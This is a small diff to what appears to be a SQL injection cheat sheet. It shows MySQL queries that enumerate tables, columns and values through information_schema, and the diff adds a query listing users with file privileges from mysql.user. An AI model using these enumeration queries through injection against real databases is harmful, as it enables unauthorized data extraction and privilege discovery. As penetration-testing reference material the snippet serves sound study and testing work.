@@ -51,6 +51,7 @@ strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
 SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
 SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
 SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
+SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges
 ```
 
 **Only 1 value**
